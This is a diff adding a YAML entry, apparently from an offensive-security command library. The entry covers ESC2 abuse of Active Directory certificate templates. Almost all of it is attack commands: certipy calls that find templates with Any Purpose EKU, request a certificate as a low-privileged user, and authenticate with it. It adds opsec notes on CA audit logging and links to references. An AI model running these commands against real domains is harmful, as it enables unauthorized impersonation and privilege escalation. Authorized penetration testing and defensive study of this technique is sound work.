@@ -1,0 +1,17 @@
+name: ADCSESC2
+description: ESC2 - Any Purpose EKU certificate template abuse
+commands:
+- '# Find templates with Any Purpose EKU (OID 2.5.29.37.0)'
+- certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable
+- ''
+- '# Request certificate with Any Purpose template'
+- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -target '<CA_HOST>' -template '<TEMPLATE>'
+- ''
+- '# Use certificate for authentication (Any Purpose allows client auth)'
+- certipy auth -pfx <USER>.pfx -dc-ip <DC_IP>
+opsec:
+- Certificate requests are logged in CA audit logs
+- Any Purpose certificates should be rare in production
+references:
+- https://posts.specterops.io/certified-pre-owned-d95910965cd2
+- https://github.com/ly4k/Certipy
